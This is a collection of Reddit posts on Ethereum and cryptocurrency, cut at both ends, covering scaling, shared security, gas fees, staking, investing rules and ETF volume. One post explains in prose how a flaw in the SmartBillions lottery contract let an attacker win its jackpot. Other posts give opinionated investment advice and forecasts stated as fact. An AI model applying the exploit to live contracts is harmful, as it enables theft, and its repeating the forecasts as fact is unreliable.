gpus more productive usecases like engineering, science, and of course, gaming. # ethereum did a rollback and will do it again people like to point to the dao fork as proof that ethereum is not immutable. but there are many nuances to this that are disingenuously ignored: \- firstly, the dao fork was not a rollback. it was a unique situation where the hackers had to wait 28 days for withdrawals, so a smart contract change was executed. \- there was strong consensus across developers, users, miners and community alike - it was hardly a centralized decision. \- those who disagreed simply moved to ethereum classic. it's a win-win situation for all. \- ethereum was still a very, very new project then. you know which other project did a rollback when it was less than 2 years old? [value overflow incident - bitcoin wiki](https://en.bitcoin.it/wiki/value_overflow_incident) \- [eip-999 being rejected](https://github.com/ethereum/eips/blob/master/eips/eip-999.md) is the final deathblow to this hypothesis. there was a chance to rollback 500,000 eth to an entity managed by one of its co-founders, and the community overwhelmingly rejected it. **rollbacks do not happen on ethereum.** # ethereum relies on infura while it's certainly true that infura is a dominant service provider, and the ecosystem definitely needs to diversify, this is demonstrably false. infura [suffered a massive outage in november 2020](https://blog.infura.io/infura-mainnet-outage-post-mortem-2020-11-11/), yet ethereum kept running just fine. sure, it disrupted some frontends, exchanges and wallets, but nothing that couldn't be fixed with simply running your own node or using a different service. since this outage, many frontends and wallets have started running their own nodes and using alternatives like alchemy. there's still more work to do on this front, but to say ethereum is reliant on infura is false. # ethereum state is growing too fast compared to bitcoin, this is certainly true. if you want a chain that's easiest to play back in archival mode, verify every transaction from genesis, then yes, bitcoin is a better option. it's just a question of how valuable this really is - given you're trusting bitcoin miners already if you want to use their network? with ethereum, you can run full nodes (not archive) on a raspberry pi 4 with a 1 tb ssd, and send and verify transactions. this is relatively accessible hardware to most users and consumers. some would argue that clients like turbogeth makes this easy enough even for archive nodes. on a related note, ethereum's state growth is much, much closer to bitcoin than binance smart chain, eos, solana or other high-tps l1 chains. the concept of users verifying transactions don't even exist for these chains. as a side note, ethereum will make more such trade-offs going forward with weak subjectivity, statelessness, state expiry etc. purists will cry foul, and that's fine - there'll be an audience that will gladly trade-off being able to sync from genesis given the tremendous benefits elsewhere. # ethereum has no fixed cap this is true, but there are good security reasons for it. i'd add that with eip-1559 and the merge, it is somewhat likely eth will hit a maximum supply of around \~120m and continue deflating or stabilising from there. # ethereum's monetary policy is unreliable this is also partially true. while many exaggerate, it is true that ethereum has seen 2 cuts in block rewards, and these were made by social consensus rather than code. eip-1559 and the merge completely overhaul ethereum's monetary policy. but yes, until eip-1559 and the merge prove themselves on mainnet without further changes over several years, this remains a valid criticism. bitcoin remains the standard for predictable and reliable monetary supply - though it does trade-off with a security risk in the future. # ethereum 2.0 is years away there are a lot of misconceptions about ""ethereum 2.0"", though the ethereum researchers an developers are largely to blame for confusing communications. firstly, we don't even call it that anymore. anyway, this just refers to a series of upgrades. the first upgrade, beacon chain, went live in dec 2020, the merge is actively being developed (the second devnet is going live today) and scheduled to release by late 2021. next comes data sharding. another misconception is these upgrades will lead to low gas fees - definitely not on l1. what data sharding will do is accelerate rollups. a much greater impact to l1 will be statelessness+state expiry, plus sharding execution if it's ever required. (the jury's now out on that one...) # ethereum has no intrinsic value, it's all created from thin air ethereum is a global, decentralized saas platform and collects revenues in transaction fees. these transaction fees are now substantial - over $1 billion per month. indeed, yesterday, ethereum generated $117m ([cryptofees.info](https://cryptofees.info)), which is $43b annualized. this would put ethereum as #2 compared to the largest corporations in the world. i don't think this sort of activity is sustainable for now, but it shows you that it's possible, and gives you a glimpse into the future. with eip-1559 releasing in july, a majority of these transaction fees will be burned, directly accruing value to all eth stakeholders. following the merge, the remaining non-burned fees (tips) will be returned to stakers, in addition to the yield they generate. not only is ethereum one of the most productive assets in the world, it also has the most advanced accrual mechanisms. # it is too difficult to stake eth this is definitely valid, 32 eth is a lot of money. however, i think there's a significant misconception about what staking is. on many of the delegated-type chains, when you're ""staking"" what you're actually doing is just delegating to someone else. some newer models like algorand randomizes this process, but you're still delegating, rather than validating. you're effectively being given free money for not really doing anything. early delegated-type systems like bitshares or eos never paid delegators, so the validators ended up bribing delegators. the new delegated-type systems simply ""pre-bribe"" delegators. of course, validators can still bribe delegators from their rewards, but that's a separate discussion. in ethereum beacon chain, you are validating your own eth, and thus earning staking fees for providing a service to the network. those that just want to stake and don't care about these technicalities, beacon chain is just the base layer, and we have multiple staking services being built on top of it, with various levels of decentralization. these staking services let you earn staking rewards for small amounts of eth. see the full list here: [ethereum 2.0 beacon chain (phase 0) block chain explorer - ethereum 2.0 staking services overview - beaconcha.in - 2021](https://beaconcha.in/stakingservices) # ethereum never executes upgrades on time and constantly change their plans (u/i_haven-t_reddit) does ethereum constantly change their plans? yeah, that's definitely true. but it's simply pragmatic. this industry is innovating rapidly, and when you have exponential advancements, it doesn't make any sense to just stick to old tech. abandoning the hybrid pow/pos makes sense, even if it means you lose out a year or so of research. going for a rollup-centric roadmap makes sense, simply because it'll deliver massive scalability sooner than anyone imagined. upgrades are definitely being executed - the beacon chain went live in dec 2020, eip-1559 happens in two months' time, and the merge goes less than 6 months after that. a perfect counter case would be cardano, which is basically obsolete 2015-era tech. dpos, single-ledger, relying on state channels and sidechains for scalability. by rejecting significant advancements like signature aggregation, sharding and rollups, they are destined to be stuck in the past. ok, maybe that's a poor example because despite being obsolete they still can't execute. seriously, though, the actual counter case is, of course, bitcoin. and that's just fine - a model like that makes sense for something that just wants to be money and nothing else. # proof-of-stake increases centralization by concentrating wealth (u/epic_trader, u/mathje, u/sn00fy) while this seems to make sense at first glance, there are many nuances to this: \- ethereum has had the benefit of 6+ years of proof-of-work, and we've seen significant token distribution in that time. now, the distribution is relatively decentralized and second only to bitcoin. \- validators and (non-validating) stakers have costs too. while hardware costs are significantly lower, there'll be taxes and overheads which will be redistributed. \- the biggest factor often overlooked is that proof-of-stake has very, very low issuance. when the merge happens, issuance will be \~0.5%. a validator cap is being proposed which will also subsequently cap issuance at only 0.8% or so. proof-of-work may still have better redistribution characteristics, but it's marginal at best. # even if companies adopt ethereum they will just run a private chain (u/sn00fy) not just companies, but we're going to see private chains being run for consumers. we are already seeing some of this with binance smart chain, but in the future, i'd speculate have big players like governments, banks, and corporations run private chains. naturally, there'll also be business adoption for the public chain with b2b activities. like i alluded to at the very beginning, only a very limited amount of gas will be consumed on the ethereum l1 chain long term. but that doesn't matter - l1 will be 100% saturated at all times, and other solutions building with ethereum only adds to its network and lindy effects. # ethereum has old tech, new chains have newer tech (u/mathje) of all the misinformation and fud that pervades this space, this is the one that grinds my gears the most. ethereum has always been at the bleeding edge of innovation, and continues to be. while there are certainly innovative projects in the space, absolutely nothing is even attempting to solve the big problems: the blockchain trilemma. consider this: every other smart contract chain uses some form of delegated-type consensus mechanism, many with a hard cap on number of validators. cosmos: 300 (currently 150); polkadot: 1,000; binance smart chain/eos: 21. the ones that end up with more validators have to compromise on scalability. beacon chain uses revolutionary new techniques like weak subjectivity and signature aggregation to enable massive decentralization with up to a million validators. there are 135,000 validators live already despite being none more than an incentivized testnet, with thousands being added every week. not to mention, beacon chain validators are not required to be online 24x7 like the other chains. or, consider this: these l1 chains can offer more throughput than ethereum's \~55 tps for eth transfers, or \~20 tps overall, sure. but ethereum is empowering rollups with data sharding to scale to 100,000 tps and beyond, with groundbreaking new tech (data availability sampling) securing it all without compromising decentralization. no l1 will ever scale to these levels, even after absolutely giving up on decentralization. not even considering hybrid solutions like zkporter or validium. or, consider this: the most innovative chains are actually rollups. just look at the phenomenal work being done by starknet. there's a good reason they are becoming rollups on ethereum and not anywhere else - it has the best consensus mechanism in the industry. or, consider this: pretty much every innovative new smart contract is released on ethereum, and then copy-pasted to other chains. in short, the ethereum ecosystem has far and away the most cutting-edge tech in the industry. # there is no real use case for ethereum. it's only used by degens for gambling and exchanging other tokens that are just as useless. (u/sn00fy) degens are paying transaction fees just like everyone else - the whole point of credible neutrality and permissionless means ethereum does not discriminate what people use the chain for. that said, it is certainly concerning that a lot of activity on ethereum seems to be speculative. this is, of course, true of all early tech. we're definitely seeing real adoption from big players as well - i don't need to repeat all the news about visa, eib bonds, etc. a lot of work needs to be done to onboard more of these non-degen usecases. # rollups are centralized it's true that some of the early rollups have centralized sequencers. this is not a security risk, though, as fraud or validity proofs will ensure the same security as ethereum mainnet. there is a liveness and censorship risk, and centralized sequencers are definitely not trustless systems. fortunately, most rollups have decentralized sequencers in their roadmaps, so this is not going to be an issue for long. # rollup-centric roadmap breaks composability ([epic\_trader](https://www.reddit.com/user/epic_trader/)) yes, and no. within rollups, everything will be composable, but between rollups/l1 nominally hey do break composability. fortunately, there are multiple projects hard at work to solve this, with relatively seamless l2<>l2 interoperability. it's still a work-in-progress, of course, but this is more of an engineering problem that is currently being solved than a theoretical hurdle. # bonus: ethereum is a frankenstein monster with two chains, two assets, eth1 and eth2 no, there's only one eth. while there are two chains that run in parallel right now, think of beacon chain as an incentivized testnet to ensure the brand new consensus mechanism works well. these chains will be merged in the next 9 months and it'll all be one ethereum again. # addendum i feel like half the comments down below are oblivious to the concept of the blockchain trilemma. no project has solved it, or is even attempting to, other than ethereum. all projects other than bitcoin and ethereum significantly compromise on decentralization and security to varying magnitudes, and most still can't offer the scalability ethereum rollups offer today - let alone after data sharding goes live. wake me up when you have a non-delegated consensus mechanism with 135,000 validators (let alone the 1 million possible) while at the same time maintaining a manageable state that can be run on a consumer laptop or a raspberry pi 4. like i mentioned, most chains have a few hundred validators at most with stake delegated and centralized to them. someone mentioned solana - according to the project's system requirements page ( [validator requirements | solana docs](https://docs.solana.com/running-validator/validator-reqs) ) it requires a cloud instance that costs $1,200/mo to run a solana node, with a state growing by several tbs every month. this is simply a different class of product that is in no way comparable to ethereum. there's nothing wrong with this, and as i've mentioned above, there'll be different solutions with varying trade-offs between decentralization and transaction costs built on top of or parallel to ethereum. # errata (edited in 18 hours after the post went live) \- 90% of the comments criticizing this post seems to be around the fees. i'll once again reiterate the blockchain trilemma, and that the ethereum ecosystem is uniquely positioned to deliver great scalability through rollups, combined with high decentralization and security. l1 gas will remain high, and that's fine, because most people will be transacting on rollups, hybrid solutions like zkporter/validium or even centralized sidechains. i think there's a significant mental block in thinking of rollups the same way as alternate l1s. rollups are exactly that - direct competitors to alternate l1s, but superior to them in almost every respect. crucially, what many seem to be misunderstanding is that no l1 can possibly offer the combined scalability the ethereum ecosystem working together at various levels can. \- while the dao fork was not technically a rollback, it was definitely in the spirit of one, and should be criticized as such. it was still a unique, one-time event, and all further attempts at rollbacks, most notable eip-999, have been unanimously defeated. \- while bitcoin mining was highly centralized in the early days, this is not a ""ninja mine"". it remains clearly a fairer launch than ethereum's. \- while proof-of-work is undeniably inefficient, it is fair to say that proof-of-stake needs to prove itself at scale before being considered superior to proof-of-work.",1689,379,0.96,2021-05-12 04:21:59,web3,ethereum,Liberosist,False,1174.6

The Great Reddit Scaling Bake-Off,"update (9/30): we are still working on finalizing our scaling solution. we've been very impressed with the breadth and depth of proposals submitted in this bake-off. many projects have done great work, and it's good to see so many ideas in the ethereum ecosystem. while we are continuing our due diligence, it's taking a bit longer than we expected to understand all the options in detail. as soon as we have more to share, we will make an update here. thank you for your patience. \*\*\* update (8/3): thanks to all the teams who submitted a proposal. we appreciate the work you put in, and we have begun reviewing the submissions. if we have follow-up questions, we will post them as comments on the submission posts. thank you. \*\*\* submissions will be organized in a collection alongside this post. we welcome the community to leave questions and comments on the proposals. **to submit your proposal**: please make a separate post in r/ethereum with your submission. then either tag u/jarins and u/evanvanness in a comment (not in the post body), or send us a pm with the link to your post. once we are notified, we will get it added to the collection. (if your post gets removed by moderator bots, do not resubmit. we will approve it when adding to the collection) while we prefer proposals to be public, if there is information you need to share privately, please send it to [jarins@reddit.com](mailto:jarins@reddit.com). \*\*\* **tl;dr: do you believe your ethereum scaling technology can handle reddit's scale? it's time to let the ethereum community hear about it. send your demo by july 31, 2020.** this is your chance to earn some fame but, to be clear, there is no prize if your solution is chosen or modified to meet reddit’s needs. our lawyer made us write this. https://preview.redd.it/q7hhi6lzlp551.png?width=1200&format=png&auto=webp&s=cdb26cbbe59e26f4fc73da5740da1308e2a87579 # the goal in conjunction with the ethereum foundation, reddit is inviting ethereum scaling projects to show the community how your scaling solution can be used to bring [community points](http://reddit.com/community-points) to mainnet. our goal is to find a solution that will support hundreds of thousands of community points users on mainnet today, and can eventually scale to all of reddit (430 million monthly users). we’ve evaluated some of the most promising scaling solutions, and have learned a few things: 1. there are plenty of awesome projects that we don't know about yet. we seem to learn about a promising new scaling solution every day. 2. most existing scaling solutions focus on the exchange use case, which favors optimizing for transfers. many of these designs don't take into consideration the costs of obtaining tokens or entering the scaling system, which can be significant. community points distributions have cost an order of magnitude more gas than all other operations combined, primarily due to on-chain storage costs associated with onboarding new users. 3. it's unclear how to determine the best solution. there is a lot of code, a lot of documentation, and a lot of hype out there. but there are very few objective real-world reviews or comparisons of various products/implementations. 4. we need the ethereum community's help to figure this out. do you have a scaling project that meets the criteria below? if so, share your demo by **july 31, 2020.** please note that all demos need to simulate community points usage for 100,000 users. we also invite all scaling experts in the ethereum community to comment on any demos submitted to enable a better understanding of the trade-offs and compromises between different solutions. we will review the demos and plan to share any updates by september. while we don’t expect any novel scaling projects, we hope that you, the ethereum scaling expert, can show us how to scale community points. **demos should include:** 1. a live proof of concept showing hundreds of thousands of transactions 2. source code (for on & off-chain components as well tooling used for the poc). the source code does not have to be shared publicly, but if reddit decides to use a particular solution it will need to be shared with reddit at some point 3. documentation 1. how it works & scales 2. cost estimates (on-chain and off-chain) 3. how to run it 4. architecture 5. apis (on chain & off) 6. known issues or tradeoffs 4. summary of cost & resource information for both on-chain & off-chain components used in the poc, as well as cost & resource estimates for further scaling. if your poc is not on mainnet, make note of any mainnet caveats (such as congestion issues). # requirements **scaling.** this poc should scale to the numbers below with minimal costs (both on & off-chain). there should also be a clear path to supporting hundreds of millions of users. * over a 5 day period, your scaling poc should be able to handle: * 100,000 point claims (minting & distributing points) * 25,000 subscriptions * 75,000 one-off points burning * 100,000 transfers **decentralization.** solutions should not depend on any single third-party provider. * we prefer solutions that do not depend on specific entities such as reddit or another provider, and solutions with no single point of control or failure in off-chain components, but recognize there are numerous trade-offs to consider **usability.** scaling solutions should have a simple end user experience. * users shouldn't have to maintain any extra state/proofs, regularly monitor activity, keep track of extra keys, or sign anything other than their normal transactions * transactions complete in a reasonable amount of time (seconds or minutes, not hours or days) * free to use for end users (no gas fees, or fixed/minimal fees that reddit can pay on their behalf) * bonus points: * users should be able to view their balances & transactions via a blockchain explorer-style interface * exiting is fast & simple **interoperability.** compatibility with third party apps (wallets/contracts/etc) is necessary. * scaling solutions should be extensible and allow third parties to build on top of it * apis should be well documented and stable * documentation should be clear and complete * third-party permissionless integrations should be possible & straightforward * simple is better. learning an uncommon or proprietary language should not be necessary. advanced knowledge of mathematics, cryptography, or l2 scaling should not be required. compatibility with common utilities & toolchains is expected. * bonus points: show us how it works. do you have an idea for a cool new use case for community points? build it! **security.** users have full ownership & control of their points. * balances and transactions cannot be forged, manipulated, or blocked by reddit or anyone else * users should own their points and be able to get on-chain erc20 tokens without permission from anyone else * points should be recoverable to on-chain erc20 tokens even if all third-parties involved go offline * a public, third-party review attesting to the soundness of the design should be available * bonus points: * public, third-party implementation review available or in progress * compatibility with hsms & hardware wallets **other considerations** * minting/distributing tokens is not performed by reddit directly \[1\] * one off point burning, as well as recurring, non-interactive point burning (for subreddit memberships \[2\]) should be possible and scalable * fully open-source solutions are strongly preferred \[1\] in the current implementation, reddit provides signed data for claims, but does not submit the actual claim transaction for the user (the user does that themselves). note that smart contracts are considered independent of reddit provided there is a path to decentralizing control over them. \[2\] subreddit memberships are currently implemented as a contract acting as an erc777-style operator that can burn points on a monthly basis, but we are open to changing that implementation. #

"A quick reminder of what ""shared security"" means and why it's so important","when evaluating a smaller chain that is somehow ""connected"" to a larger chain, the most important question to ask is this: **if an attacker can 51% attack the smaller chain, how much damage can they do?** this is a very realistic and important question to ask, because the smaller chain is very often *much* smaller (in terms of market cap) than the larger chain, and it's often quite feasible for an attacker to actually buy up 51% of the tokens (or at least 51% of the *staking* tokens), especially if there's a large amount of bridged assets parked inside the chain that they could steal. * if the smaller chain is an **""independent l1""**, they **can steal everything**. they can make a block that illegally edits the state to give them all the coins, and then withdraw the coins through the bridge, and there's no verification happening on the larger chain. * if the smaller chain is a **""sidechain""**, they **can steal everything**, for the same reason. however, **security** ***can*** **be slightly better** than fully independent l1s, because sidechains whose block headers are published to ethereum are guaranteed to revert if ethereum reverts, preventing thefts involving 51% attacks on ethereum but *not* the sidechain. * if the smaller chain is a **""rollup""**, they **can delay transactions** and perhaps even force users to pay l1 fees, but they **can't steal anything**. this is because there is an on-chain mechanism (whether fraud proofs or data availability proofs) that can actually check that the events on the smaller chain leading up to the attacker's withdrawal are all valid. a couple more niche examples: * if the smaller chain is a **""plasma""**, they **can delay transactions** and force users to pay l1 fees, but they **can't steal anything**. * if the smaller chain is a **""validium""**, they can **permanently lock up all the users' money** but they **can't steal anything**. validiums (eg. [starkware's immutablex](https://medium.com/starkware/starkex-now-for-nfts-bfdc9f4655a2)) are thus an interesting middle ground. they are not quite ""true l2s"" to the same extent as rollups are, because someone who takes over the validium can still deny users access to their funds and extort them, but they are nevertheless significantly more secure than sidechains, and importantly they can be as scalable as sidechains. **this is what we mean by ""shared security"". if you are hodling assets and doing stuff on the smaller chain, are you as secure as if you were doing it on the larger chain, or are you less secure?** on a rollup or a plasma, you are just as secure. on an independent l1 or a sidechain, you are much less secure. on a validium, you're somewhere in the middle. &#x200b; |\[--- platform type ---\]|\[--- security compared to base chain ---\]| |:-|:-| |independent l1|very much less secure| |sidechain|much less secure| |validium|somewhat less secure| |rollup|just as secure| |plasma|just as secure| note also that for reasons i described in [this earlier post](https://old.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrngyk8/), a lot of this is actually symmetric: if you are holding etc, you are better off holding it on a zk rollup rooted in etc than you are holding it wrapped on ethereum (even if the bridge is a perfect zk-snark verifier of ethereum's consensus). it's not really about being on the biggest chain you can be. it's about the domain your activity is one being part of the same shared security zone as the domain where the assets you're using were originally issued, where a **shared security zone** is defined as ""a chain, and all other chains \[eg. rollups\] whose security is ultimately dependent only on that chain"". but this doesn't change the above categorization; it only makes it stronger, as these differences in security persist even if ethereum itself gets 51% attacked. some more specific examples: |\[--- asset is issued on ---\]|\[--- you are using that asset on ---\]|\[--- security level ---\]| |:-|:-|:-| |ethereum|ethereum|high| |ethereum classic|ethereum classic|medium-high| |bitcoin sv|bitcoin sv|low| |ethereum|avalanche|low| |avalanche|ethereum|low| |ethereum|starkex (rollup mode)|high| |ethereum|arbitrum|high| |optimism|ethereum|high| |arbitrum|zksync|high| this is because (ethereum, optimism, arbitrum, zksync, starkex rollup mode) are in the same shared security zone (as the latter four are all ultimately secured by ethereum, or at least soon will be when the fraud proof mechanism is fully enabled with all temporary backdoors removed), but avalanche and ethereum classic are not and likely never will be. bsv is insecure on bsv despite being in the same shared security zone as itself, because bsv is a weak pow chain that is easily attackable by bored btc and/or bch miners and has blocks that are too large for users to verify (with no plans to add sharding/zk-snark/das technology to fix this), so someone who 51% attacks bsv can just push invalid blocks through and users would probably have no choice but to accept them.",1642,254,0.98,2022-01-30 11:44:11,web3,ethereum,vbuterin,False,1096.6

"The biggest security threat to Ethereum is not a 51% attack, it's getting replaced by centralized pseudo-cryptocurrency","the recent post titled [*binance, a centralized exchange, is taking total advantage of the absurdly high gas fees. and unfortunately they’re doing a damn good job of it.*](https://old.reddit.com/r/ethereum/comments/loy1qe/binance_a_centralized_exchange_is_taking_total/) got me thinking. most people including me until recenty have been thinking that the high fees on eth are crazy uncomfortable right now but it doesn't matter long term as it's being worked on and therefore temporary, it's just a ""pause"" in its utility and all the good times will just resume once it's solved by l2, sharding or pos. the surge in bnb value is a wake up call, as the op in the linked thread put it: > i hate that they are completely centralised but make themselves seem decentralized. they have complete control over the bnb token. **this is exactly what the crypto community feared and wanted to avoid all along.** that's exactly right, that's what we feared and should have feared much more as it gets more real every day. especially because as another poster put it: > the open market doesn't give a shit about decentralization. if you don't agree, you're actually in the minority. that's why pancakeswap rocketed to #1. that's why tether is used to this extent. that's why xrp is top 10. that's why exchanges control over 40% of eth staking. that quote is frightening, it's frightening because it's true. majority of people in general, be it traders, devs or users do not care about decentralization. and the more people from general population join the crypto space, the more it becomes the reality for that space. **that's where lies the very real danger for eth of, not being attacked from within, but being replaced and overtaken by centralized pseudo-coins and once this happens it might stay that way forever given the above!** up until now many thought that eth is far too ahead to be challenged and we can afford a year or two until scaling solutions are deployed, but **bnb showed otherwise, it got 500% closer in *two weeks*, we *do not have* 2 years to solve this! they repeat this feat just once and eth is no longer the largest smart contract chain in crypto.** the fee issue needs to be taken seriously if we want to protect eth, it's a very real security risk, far bigger at this point than 51% attack, or state growth, uncle rate etc. half of top 10 coins are centralized pseudo-coins, the threat is real not only for eth but all truly decentralized cryptos. so let's not underestimate it. we're bleeding developers, users, future innovation right now. i've seen multiple posts and comments about people abandoning eth leaving for another chain because of the fees. **once they have this bad experience and invested time and money in another chain, they're not coming back. this is ""invisible"" at first, that guy who left is going to have his project completed and mature in 3-5 years but it will be too late then when we start to see it more openly, it's no stopping it then.** also when centralized projects close in or overtake eth even for a while that's when they're going to take full advantage of their centralized nature. **they're going to be making big bucks which are going to go toward troll farms, media, ""influencers"", armies of paid devs and big institutions are going to buy in as they just love centralization. it's also going to be too late once this becomes apparent.** we might end up rambling about it in an obscure corner of the internet, be eth fanbois that nobody cares or even knows about - it might seem unimaginable now but once this train gets rolling it might end up exactly like that 5-10 years from now, crypto moves at lightspeed. if you're thinking that rollups will solve this, think again, l2 is complex and suitable only for a very narrow set of use cases, look at ln on btc, it totally flopped. crypto is complex enough, l2 is a level above that and it takes years to make the ux good enough. l2 on eth breaks composability or makes it complex to the power of 2. **are we willing to gamble the future of eth on the hope that l2 gets adopted quickly enough contrary to all experience until now? that carrot has been dangled with segwit/ln on btc for years now, let's please not make the same mistake.** so what am i proposing? as a first step we need to alleviate the pressure *right now*, that can be done only by raising the block gas limit substantially asap, at least double it, ideally quadruple it. we've had time for l2, other scaling solutions a year ago, but that ship has sailed, there is no more time. if you're thinking about the drawbacks of raising the limit, think it in a context of a real threat to eth security - would it be worth it if there was an imminent threat of a 51% attack? would it be worth to raise the limit to prevent the attack then? because that's the situation we're in, just more insidious as the damage caused today is going to show itself only in a few years when there is no longer anything we can do about it. but i do not think there are any real showstoppers here, uncle rate is at atl, storage and state growth doesn't matter if we can handle it now as in a few years it will become orders of magnitude easier to handle, for the comuters in 5-10 years it will be just a immaterial blip. this will buy us time to develop l2 and rollups, which in turn buys us time for sharding and pos but we need to kick the can down the road right now as to stop the bleeding. **anyway, if you take anything from this write up, even if you disagree with some suggestions, it's that high fees are a serious security risk on par with a 51% attack. and it should be taken just as seriously, by the devs and by the users. beware and be suspicious of people minimizing that risk (in a reasonable way ofc), troll farms may soon be in full swing and the likes of bnb would like nothing more than for us to underestimate this threat.**",1465,377,0.94,2021-02-21 20:54:53,web3,ethereum,Freedom-Phoenix,False,1039.2

Ethereum is transitioning from ‘Rewards to miners’ to ‘Rewards to owners’.,"there are many changes to ethereum like the amazing tech being developed to address transactions, electricity, decentralization, etc. but also the economics that drive the blockchain. 1. eip-1559 addresses inflation and makes choosing fees for transactions easier. that alone will be a supply shock similar to a bitcoin halving. where inflation drops. we know how that affects btc. what is less discussed is the following: a large portion of rewards will transition from eth miners to eth owners. we don’t have btc as an example for the effect of that transition. i’m curious what are the best and worst case scenarios from that. not price, because we can all deduce it’s positive. however, what about the miners? will enough incentive remain to keep the network secure between 1559 and eth2 being fully operational?",1520,271,0.97,2021-05-04 14:00:39,web3,ethereum,EarningsPal,False,1030.1

I lost 650k from last bull run.,"i been in crypto since 2017. i got into it during the top back then. was just a poor college grad, so i didn't have much to lose. luckily as crypto crashed in 2018 i landed a nice paying job. i was putting 90% of my pay check into crypto up until mid 2020. buying btc at 3k and eth sub 100. i bought chainlink at 30 cents. a few other good entries too. sadly i also had a big portion of my shitfolio in xrp, but tbf it had some fair returns in 2021. i sold my portfolio in feb 2021, a bit too early. and as you guessed, everything ran up 2-3 x higher after i sold. i told myself i wouldn't look back. and that we were entering a long bear market. i had about 700k at that time. all of it put into anchorrrrr. quit the job too like a fool. and as you already know 2021 was a double bubble. later, in november that year btc reached new ath's, followed by a correction. i thought a major alt season was on the rise. ""i just need a 2x to make up for what i missed out on."" i still remember that one night, at the intersection in my car at a red light. it was midnight and i was the only one there. looked at my phone and saw -50% across the entire crypto market. it was all downhill from there. not everyone wins. in order for you to win, someone must lose. who here is from the 2017 era still hasn't ""made it""? am i the only one? like a child held back a grade? i'm still here, it was painful. my portfolio was near ath's recently, but not quite. the bull isn't exactly guaranteed. i been learning ta for the past few years and listening about how the markets work. but i'm still here, for now.",1029,769,0.85,2024-05-19 22:54:07,web3,CryptoCurrency,igothackedUSDT,False,933.5
Why are there so few active users when BTC is at 90k+? It makes no sense. Are we that early in the bullrun?,"i've started to see news about bitcoin again, which is a telling sign, but active users on reddit seems stagnant, still. or maybe the numbers we had in the prior bullrun were inflated by moon farmers? institutions seem to be driving this run, is there any chance for retail to be wary of the high btc price this time? we're talking about 90k now, it's intimidating af to think about buying a whole bitcoin compared to the previous run. i am thinking that the huge price of btc might also be the catalyst for the alt season. newcomers might want to try their luck playing the alt casino. what are your thoughts on this?",1027,769,0.89,2024-11-13 10:06:22,web3,CryptoCurrency,eueste,False,932.6999999999999

SmartBillions lottery contract just got hacked!,"someone made it in the “hackathon” (lol). the hacker could withdraw 400 eth before the owners, who wrote “the successful hacker keeps all of the 1500 eth reward”, withdrew quickly the remaining 1100 eth, that happened 5min before the next transaction (from the “hacker”) would have emptied the whole contract. so that’s already a lie from their side. the other point is that the owners were able to withdrew all contract funds; which in theory they could have done after ico and run with all the investor money. they always remained anon, which also shows there weren’t good intentions in first place. how did it happen? their lottery functions were flawed, if you place a bet (systemplay() function) with betting on number value “0” and then call the won() function after 256+ blocks (after you placed the bet) the returning value will be “0” so you would have bet on “000000” and result would be “000000” and baaam you have the jackpot. the lucky guys first bet was “1” so “000001” and result after 256+ blocks calling won() would be “000000” so he matched 5 correctly which is 20000x and with 0.01eth bet amount a win of 200eth. he managed to pull that 2 time and corrected to “0” and for that transaction he had to wait for 256+ blocks, but 5 min before he could call won() the owners withdraw all funds. moral of the story, that ico was a scam seeing the owners remains anon all the time and were able to withdraw all contract funds (doing that after ico would have been fatal for investors). they thought they are clever, building a honeypot for investors but at the end their poor coded contract caused them damage of 400eth and no damage to potential investors. contract: https://etherscan.io/address/0x5ace17f87c7391e5792a7683069a8025b83bbd85 page: https://smartbillions.com",1340,285,0.94,2017-10-04 22:26:34,web3,ethereum,supr3m,False,927.4

Rules to live by in crypto,"1. never invest money you will need in a short period of time. this is not a game, so quit playing. 2. never invest money you will need during an emergency. you might be down at that moment. 3. when investing forget about the money you invest. solid projects go up and down on the daily but on the yearly it’s mostly up. 4. get use to 20-50% drops and months if not years of no sign of life. the faster you get use to this the less stressed you will be. 5. always go against the market, by that i mean panic buy when everyone is panic selling, take profit when everyone is fomoing in. 6. time in the market beats timing the market! persistence always wins. 7. everybody is a genius in a bull run. 8. never share your private key or input your 12/24 word phrase if you are asked by anyone anywhere. 9. if you get an email that causes you fear and a heart attack it’s most likely a scam. always doble check the email, if it’s a scam it will be some random email. 10. never click random links in emails! you ain’t getting shit free in life. 11. if it’s too good to be true, it most likely is. 12. meme coins are a gamble not an investment, always take profit or at least your initial investment. have something to show for it, rich on paper is not something to be proud of. life changing money mean nothing if you don’t change your life with them. 13. never chase pumps. you missed it. it’s gone. move on. don’t chase it. you playing with fire. 14.never panic sell, there will almost always be a bounce if you want to sell do it then. 15. (for usa residents) if you sell for profit or switch between cryptos be ready to pay taxes. yes you can hide it, but remember sooner or later uncle sam will get his piece of the pie if not the whole cake. 16. always have a nice stack on the side for major dip days. millionaires are made during bear markets. 17. the trend is your friend until the end. 18. do not leave large funds on an exchange, not your key not your crypto. go ask those who used mt gox, cryptopia and many other “good exchanges”. 19. be prepared to be down or even for at least 2 years, yes even if you are up 1000%, bear markets can be brutal. ask those who were up in late 2017. 20. quality over quantity! it’s better to invest big on 5 projects than small on 15 projects. 21. don’t hate on bitcoin. it made all this possible. it will remain king no matter what place it’s in. it’s like hating your grandpa for being slower than you. he is the reason you alive in the first place. been in this game since 2016, i know it ain’t much compared to some other cats on this forum but i believe they would also agree.feel free to add shit i missed.",1391,183,0.94,2021-11-05 06:09:10,web3,ethereum,Pupulikjan,False,917.2

Why didn't the price move today? Answers inside.,"a lot of folks here are curious why $4.5billion of volume in the btc etfs didn't cause the market to skyrocket. (1) the ""spot"" etfs are required to hold the underlying btc, but they do not buy/sell in the ""spot"" market. they aren't trading on coinbase like us plebs. these etfs are using the ""over the counter"" market. essentially coinbase has an otc trading desk that matches up whale buyers and whale sellers at an agreed upon price. - whale sellers use otc because if they dump 10,000 btc on the exchanges they will get murdered by slippage. - whale buyers use otc because if they buy 10,000 btc on the exchanges they will get murdered on slippage. (2) the etfs are required to settle their fund activity each trading day based on the net amount of shares sold vs. shared purchased over the course of the trading days. for example, if they had 500 shares sold and 750 shares bought means they need to cover 250 shares worth of btc. they can do this as often as they want during the day, but any time they do this its via the otc market (see above). again, they do this otc so it's not gonna show up on the exchanges or the tradingview charts. (3) the $4.5billion is the total volume for the day... it includes both buys and sells. if you bought 200 shares of ibit at 9:30am and then sold that 200 shares at 10:15am, that's 400 shares worth of volume today even though the net net for the etf is zero at the end of the day. (4) gbtc had $2.5billion of volume. i strongly believe that most of this volume was sells (edit: ""selling"" of gbtc in this context is essentially redeeming a share of gbtc by selling it back to grayscale). why? - long term holders who are in profit and what to cash in now that the fund is trading - tax-advantaged funds like iras who have no tax penalties can easily move to lower fee funds like 